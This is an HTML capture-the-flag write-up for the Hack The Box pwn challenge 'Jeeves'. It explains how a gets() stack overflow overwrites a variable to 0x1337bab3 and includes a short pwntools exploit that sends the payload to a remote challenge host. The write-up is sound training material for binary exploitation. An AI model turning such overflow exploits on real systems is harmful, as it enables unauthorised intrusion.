@@ -1,0 +1,78 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>PWN/Jeeves - Easy</h1>
+            <h2>July 2021</h2>
+            <h4>Simple Overflow</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    How are you doing, sir?
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br><br>
+    	The binary only contains 1 relevant function. The main function checks if a stack variable is equal to 0x1337bab3. If it is, it opens flag.txt and prints out the flag. The function contains the unsane function gets, so we can use a buffer overflow to overwrite this variable correctly and get the flag. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/jeeves1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        This works and allows us to retrieve the flag. The exploit is posted below.
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/jeeves9.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '46.101.23.188'
+    port = 31412
+    p = remote(host,port)
+
+
+payload = b'A'*60 + p64(0x1337bab3)
+p.sendline(payload)
+
+p.interactive()
+
+        </code>
+    </pre>
+</div>
+<br><br>
+
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
